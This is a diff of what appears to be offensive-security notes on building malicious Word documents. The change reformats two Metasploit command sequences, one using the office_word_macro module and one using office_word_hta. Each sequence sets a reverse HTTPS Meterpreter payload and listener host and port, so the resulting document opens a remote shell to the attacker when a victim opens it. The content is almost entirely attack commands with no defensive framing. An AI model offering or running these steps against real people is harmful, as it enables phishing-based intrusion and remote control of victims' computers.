@@ -7,15 +7,15 @@ TODO: Finish the rest
 ```
 msf > use exploit/windows/fileformat/office_word_macro
 
-set payload windows/x64/meterpreter/reverse_https
+msf exploit(windows/fileformat/office_word_macro) > set payload windows/x64/meterpreter/reverse_https
 
-set customtemplate /path/to/document.docx
+msf exploit(windows/fileformat/office_word_macro) > set customtemplate /path/to/document.docx
 
-set lhost <IP>
+msf exploit(windows/fileformat/office_word_macro) > set lhost <IP>
 
-set lport <PORT>
+msf exploit(windows/fileformat/office_word_macro) > set lport <PORT>
 
-run
+msf exploit(windows/fileformat/office_word_macro) > run
 ```
 
 ## 02 - VBA Macro with HTA
@@ -23,13 +23,13 @@ run
 ```
 msf > use exploit/windows/fileformat/office_word_hta
 
-set payload windows/x64/meterpreter/reverse_https
+msf exploit(windows/fileformat/office_word_hta) > set payload windows/x64/meterpreter/reverse_https
 
-set lhost <IP>
+msf exploit(windows/fileformat/office_word_hta) > set lhost <IP>
 
-set lport <PORT>
+msf exploit(windows/fileformat/office_word_hta) > set lport <PORT>
 
-run
+msf exploit(windows/fileformat/office_word_hta) > run
 ```
 
 ---
